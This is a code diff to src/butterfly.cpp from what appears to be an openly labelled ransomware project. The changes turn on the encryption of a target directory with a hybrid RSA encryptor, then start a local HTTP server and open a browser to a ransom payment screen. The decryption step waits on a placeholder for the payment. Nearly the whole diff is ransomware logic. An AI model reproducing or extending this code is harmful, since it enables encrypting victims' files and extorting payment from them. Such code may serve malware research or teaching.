+++ src/butterfly.cpp
@@ -13,6 +13,8 @@ Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::Argument
     // init logging
     initLoggingFramework();
 
+    // creating the browser url with http server port
+    BROWSER_URL_PORT = butterfly::params::LOCALHOST_URL + ":" + std::to_string(butterfly::params::HTTP_SERVER_PORT);
 }
 
 void Butterfly::initLoggingFramework()
@@ -98,17 +100,26 @@ void Butterfly::run()
     if ( !_args.dir.empty() )
     {
         std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
-        /*
-        // Start encryption
+
+        // ################## Start the butterfly encryption mechanism  ##################
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
         encryptor->invokeDir(_args.dir, _args.protection);
-        */
+
         // After encryption start http server, gui or wallpaper
-        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8080);
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(butterfly::params::HTTP_SERVER_PORT);
         server->run(false);
 
-        // Wait for ransom payment
+        std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
+        // After encryption open the browser and visualize the ransom payment screen
+        browser->open(BROWSER_URL_PORT, false);
+
+        // Blocking call to wait for the ransom payment
         //TODO: Wait for ransom payment
+        sleep(30);
+        std::cout << "Ransom was paid!" << std::endl;
+
+
+        // ################## After ransom payment start the decryption process ##################
 
         // Load encrypted files CPrivateRSA.bin and RSA.bin as hex strings
         std::string cprivateRSAFileHex, rsaFileHex;
@@ -146,10 +157,19 @@ void Butterfly::run()
     else if ( !_args.encrypt.empty() )
     {
         std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
-
+        // Start the encryption
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
         encryptor->invokeDir(_args.encrypt, _args.protection);
 
+        // After encryption start http server, gui or wallpaper
+        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(butterfly::params::HTTP_SERVER_PORT);
+        server->run(false);
+
+        std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
+        // After encryption open the browser and visualize the ransom payment screen
+        browser->open(BROWSER_URL_PORT, true);
+        // Finally stop the server
+        server->stop();
     }
     // Start only Decryption with the remote decrypted file
     else if ( !_args.decrypt.empty() && _args.serverpKey.empty())